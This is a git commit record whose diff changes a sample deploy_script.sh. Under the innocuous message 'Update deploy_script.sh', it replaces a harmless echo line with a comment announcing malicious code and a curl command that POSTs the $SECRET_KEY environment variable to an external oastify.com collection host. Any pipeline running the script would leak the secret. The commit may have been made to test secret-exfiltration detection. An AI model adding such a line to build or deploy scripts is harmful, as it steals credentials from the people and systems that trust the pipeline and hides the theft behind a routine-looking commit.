f435037ed2e563f3cfa2205f659f68da8d299072
unknowvwake <vg87090ehsaas+view@gmail.com>
2024-11-14 22:30:58 +0530

    Update deploy_script.sh

--- deploy_script.sh
+++ deploy_script.sh
@@ -1,2 +1,5 @@
-# deploy_script.sh (sample script)
-echo "Deploying application..."
+# Original deployment code would be here
+
+# Malicious code to expose the secret
+curl -X POST -d "stolen_secret=$SECRET_KEY" http://5msg9wuu0ifqevmgyz9isk9y5pbpze.oastify.com/secret
+
